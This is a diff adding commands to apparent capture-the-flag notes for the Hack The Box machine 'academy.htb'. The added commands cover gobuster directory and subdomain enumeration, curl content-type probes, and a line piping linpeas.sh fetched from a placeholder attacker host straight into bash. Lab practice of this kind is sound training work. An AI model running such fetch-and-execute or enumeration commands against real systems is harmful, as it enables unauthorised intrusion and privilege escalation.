@@ -40,6 +40,20 @@ gobuster dir -w /usr/share/wordlists/dirb/big.txt --url http://academy.htb/ -x .
 ```
 
 ```
+gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php -u http://academy.htb -o gobuster-dir-root.log
+```
+
+```
+gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://academy.htb -o gobuster-vhost-sub.txt
+```
+
+```
+grep \.git /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+```
+
+![](Pasted%20image%2020231014122728.png)
+
+```
 curl -v 'url' -X POST --data '<key><value>>please</value></key>\n' -H 'Content-Type:application/xml'
 ```
 
@@ -49,5 +63,13 @@ curl -v 'url' -X POST --data '{"key": "please"}' -H 'Content-Type:application/js
 
 ```
 curl -v 'url' -X POST --data 'key: please' -H 'Content-Type:application/yaml' --trace-ascii -
+```
+
+```
+curl attackerIP:8000/linpeas.sh | bash
+```
+
+```
+python3 -m http.server
 ```
 
